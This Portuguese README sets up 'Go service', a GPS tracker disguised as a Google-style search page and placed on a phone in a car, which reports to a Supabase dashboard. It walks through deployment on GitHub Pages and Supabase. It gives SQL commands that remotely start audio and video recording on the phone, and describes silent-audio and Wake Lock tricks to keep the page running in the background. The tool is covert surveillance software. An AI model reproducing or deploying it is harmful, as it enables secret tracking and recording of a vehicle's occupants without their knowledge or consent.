# 🔍 Go service - Rastreador GPS

Sistema de rastreamento disfarçado como página de pesquisa (estilo Google), com dashboard para múltiplos carros (PALIO 1 e PALIO 2).

## 📦 Arquivos do projeto

| Arquivo | Função | Onde abre |
|---|---|---|
| `pesquisa.html` | Rastreador disfarçado "Go service" | Celular do carro |
| `rastreamento_palio.html` | Dashboard com PALIO 1 + PALIO 2 + 3 status | Seu PC/celular |
| `manifest-clock.json` | Manifesto PWA "Go service" | (junto com pesquisa.html) |
| `sw.js` | Service Worker (cache + push + sync) | (junto com pesquisa.html) |
| `setup_supabase.sql` | Cria tabelas e bucket no Supabase | (config Supabase) |

## 🎯 Status do dashboard

| Status | Cor | Quando | Pino no mapa |
|---|---|---|---|
| 🟢 **ONLINE** | `#22c55e` | ≤ 5 min sem update | Azul sólido |
| 🟡 **SEM CONEXÃO** | `#f59e0b` | 5–60 min | Azul + círculo laranja pulsante |
| 🔴 **OFFLINE** | `#ef4444` | > 60 min | Cinza |

## 🚀 Como publicar no GitHub Pages

### 1. Criar repositório
- Acesse https://github.com/new
- Nome: `rastreador` (ou outro)
- **Público** (obrigatório para GitHub Pages grátis)
- Marque "Add a README file"
- Create repository

### 2. Fazer upload dos 5 arquivos
- Add file → Upload files
- Arraste: `pesquisa.html`, `rastreamento_palio.html`, `manifest-clock.json`, `sw.js`, `setup_supabase.sql`
- Commit changes

### 3. Ativar GitHub Pages
- Settings → Pages (menu lateral)
- Source: Deploy from a branch
- Branch: `main` / Folder: `/ (root)`
- Save

### 4. Acessar (HTTPS público)
```
Celular do carro:  https://SEU_USUARIO.github.io/rastreador/pesquisa.html
Seu dashboard:     https://SEU_USUARIO.github.io/rastreamento_palio.html
```

## 🗄️ Configurar Supabase

1. Crie projeto em https://supabase.com
2. Vá em **SQL Editor**
3. Cole todo o conteúdo de `setup_supabase.sql`
4. Run
5. Cria tabelas: `comandos`, `rastreador`, `rastreador_historico`
6. Cria bucket público: `videos`

## 📱 Como usar

### No celular do carro (rastreador)
1. Abra `https://SEU_USUARIO.github.io/rastreador/pesquisa.html`
2. Chrome → Menu → **Adicionar à tela inicial**
3. Abra o app "Go service"
4. **Toque uma vez na tela** (ativa o sistema)
5. Aceite as permissões: Localização, Microfone, Câmera
6. Bolinha verde aparece no canto inferior esquerdo

### No seu PC/celular (dashboard)
1. Abra `https://SEU_USUARIO.github.io/rastreamento_palio.html`
2. Veja PALIO 1 e PALIO 2 no mapa satélite
3. Clique nos botões do topo pra alternar entre carros
4. Botão "VOLTAR AO CARRO" faz zoom até o pino

## 🔧 Configurar múltiplos carros

No `rastreamento_palio.html`:

```js
const CARS = {
  PALIO1: { device_id: "LG",   label: "PALIO 1" },
  PALIO2: { device_id: "LG2",  label: "PALIO 2" }
};
```

Cada carro precisa de um **device_id diferente** na tabela `rastreador`. Pra testar o PALIO 2:

```sql
INSERT INTO rastreador (device_id, lat, lng, updated_at)
VALUES ('LG2', -20.3881, -43.7569, now());
```

E no `pesquisa.html` (ou em uma cópia dele pra cada carro), troque o `DEVICE_ID`:

```js
const DEVICE_ID = "LG2";  // pro segundo carro
```

## 🎙️ Comandos remotos (áudio/vídeo)

Pra enviar comandos do dashboard, ainda precisa usar o `carro_gps.html` (versão com botões 🎙️🎥🎬). Ou insira comandos direto no SQL:

```sql
INSERT INTO comandos (device_id, acao) VALUES ('LG', 'audio');  -- grava áudio
INSERT INTO comandos (device_id, acao) VALUES ('LG', 'video'); -- grava vídeo
```

## ⚠️ Limitações do PWA

| Situação | Funciona? |
|---|---|
| Aba aberta e visível | ✅ Perfeito |
| Aba em segundo plano | 🟡 Funciona com áudio silencioso + Wake Lock |
| App minimizado (PWA) | 🟡 Por alguns minutos |
| App fechado pelo usuário (swipe) | ❌ Morre |
| Modo economia de bateria | ❌ Bloqueia tudo |
| iPhone em background | 🔴 Fraco (iOS é agressivo) |

## 🔒 Sobre a chave do Supabase

A chave `sb_publishable_...` está visível no código JavaScript. Isso é OK porque:
- É a chave **anônima** (apenas leitura/escrita nas tabelas permitidas)
- As políticas RLS protegem os dados
- Nunca exponha a `service_role` key no frontend

## 👤 Créditos

Criado por **Elias Costa • NEGRET'S**
